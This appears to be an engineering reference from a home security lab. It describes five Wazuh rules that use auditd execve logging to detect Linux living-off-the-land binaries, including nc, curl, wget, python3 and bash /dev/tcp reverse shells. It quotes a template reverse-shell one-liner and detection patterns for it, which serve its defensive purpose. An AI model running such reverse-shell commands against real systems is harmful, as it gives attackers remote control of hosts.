# Linux LOLBIN Detection Rules — Engineering Reference

## Overview

5 custom Wazuh detection rules (100021–100025), written to close a real gap identified mid-project: the shared Wazuh instance had no process-level visibility on the Linux endpoint at all — Sysmon-equivalent telemetry simply didn't exist for Ubuntu. These rules, and the `auditd` infrastructure behind them, were built specifically to fix that. Full story of why and how in [Drill 4's write-up](../drills/drill-04-linux-lolbin.md).

These rules live in the same `local_rules.xml` file as `home-soc-lab`'s original 10 rules (100001–100010) on the shared Wazuh Manager — this repo's copy of the file is scoped to just the rules this project added.

## Why `auditd`, Not Sysmon

Sysmon is Windows-only. Its closest Linux equivalent is the **Linux Audit Daemon (`auditd`)**, configured with an `execve` syscall rule to log every process launch — the same underlying event Sysmon's EventID 1 captures on Windows, just through a completely different subsystem with its own log format and field names.

```bash
sudo auditctl -a always,exit -F arch=b64 -S execve -k lolbin_exec
```

## Field Choice: `audit.command`, Not `audit.execve.a0`

The first draft of these rules matched against `audit.execve.a0` (the raw first argument from `auditd`'s `EXECVE` record). This turned out to be unreliable: Wazuh's decoder only reliably populates `execve.a0` when the value is quote-wrapped in the source log, and `auditd` splits a single process launch across **two separate record types** (`SYSCALL` and `EXECVE`) that don't always decode into the same field set. `audit.command` — a field on the `SYSCALL` record — proved consistently and reliably populated across every test case, and every rule here matches against it instead.

## Design Note: Why `bash` Isn't Presence-Matched

`nc`, `curl`, `wget`, and `python3` are rare enough in normal Linux usage that matching on presence alone is a reasonable signal — nobody runs `nc` by accident. **`bash` is different.** It's the default interactive shell; every terminal session, every script, every cron job invokes it. A presence-only rule on `bash` would fire constantly and become exactly the kind of alert an analyst learns to ignore.

Rule 100025 instead matches a known-malicious *pattern* — `/dev/tcp` (a bash built-in almost exclusively seen in reverse-shell one-liners like `bash -i >& /dev/tcp/<ip>/<port> 0>&1`) — rather than mere invocation of the shell itself.

## Real Bug Found: `auditd`'s Hex-Encoding Behavior

`auditd` hex-encodes any `EXECVE` argument containing shell metacharacters (`>`, `;`, quotes, etc.) — so a real reverse-shell command like `echo test > /dev/tcp/127.0.0.1/1` never appears as plain text in the log. It appears as a continuous hex string: `2F6465762F7463702F` is the hex encoding of `/dev/tcp/`. Rule 100025 matches **both** forms:

```xml
<match type="pcre2">(?i)/dev/tcp/|2F6465762F7463702F</match>
```

This is also, notably, close to the *common* case for real attacks — a plain, unencoded `/dev/tcp` reference in a log is the unusual case; genuine reverse-shell one-liners almost always trigger the encoding, since they inherently use shell redirection syntax.

## Rule-by-Rule Breakdown

### Rule 100021 — netcat/nc Execution (T1105, T1219)
**What it detects:** `nc` or `netcat` binary execution. Classic dual-use tool for reverse shells, port scanning, and raw data exfiltration.

### Rule 100022 — curl Execution (T1105)
**What it detects:** `curl` execution — commonly abused to download second-stage payloads.

### Rule 100023 — wget Execution (T1105)
**What it detects:** `wget` execution — same payload-download concern as `curl`, different tool.

### Rule 100024 — python3 Execution (T1059.006)
**What it detects:** `python3` execution — a common vehicle for inline malicious scripting (`python3 -c "..."`) or dropped script execution.

### Rule 100025 — Bash Reverse Shell Pattern (T1059.004)
**What it detects:** The `/dev/tcp` bash built-in, in either plain-text or hex-encoded form — see above.

## Validation Workflow

Same discipline as `home-soc-lab`'s original rules, with one addition made necessary by `auditd`'s two-record-type structure:

1. **XML syntax check** — `sudo xmllint --noout /var/ossec/etc/rules/local_rules.xml`
2. **Restart Wazuh Manager** — `sudo systemctl restart wazuh-manager`
3. **Offline rule-logic check** — `sudo /var/ossec/bin/wazuh-logtest`, fed a real raw audit log line pulled from `ausearch`, to confirm the rule matches *before* attempting live-fire (this caught the `execve.a0` vs. `audit.command` field issue before it wasted a live-fire cycle)
4. **Live validation** — real attack execution, confirmed via the Wazuh dashboard, cross-referenced against the raw audit trail (`ausearch -k lolbin_exec`)

All 5 rules confirmed live-fire in [Drill 4](../drills/drill-04-linux-lolbin.md).
